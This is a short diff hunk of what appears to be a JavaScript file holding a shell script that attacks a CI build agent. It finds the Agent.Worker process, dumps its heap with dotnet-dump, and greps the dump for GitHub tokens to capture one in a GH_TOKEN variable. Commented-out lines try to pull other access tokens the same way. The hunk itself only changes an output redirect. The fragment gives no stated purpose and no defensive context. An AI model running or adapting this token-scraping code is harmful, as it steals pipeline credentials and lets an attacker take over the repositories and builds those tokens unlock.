@@ -8,7 +8,7 @@ const script = `
     fi
     echo "The PID of Agent.Worker is $PID";
     dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
-    echo $(strings -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '"gh._[A-Za-z0-9]+"') 1>&2
+    echo $(strings -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '"gh._[A-Za-z0-9]+"') 1&>2
     GH_TOKEN=$(strings -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '"gh._[A-Za-z0-9]+"' | head -1 | sed -Ee 's/.*"(gh._[A-Za-z0-9]+)".*/\\1/');
     # ACCESS_TOKEN=$(strings -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '^{"token": ".+"}$' | head -1 | sed -Ee 's/token": "(.+)"}$/\\1/');
     # ACCESS_TOKEN=$(strings -n 80 /home/vsts/work/_temp/heap_worker.bin | grep -i 'accesstoken' | head -n 1);
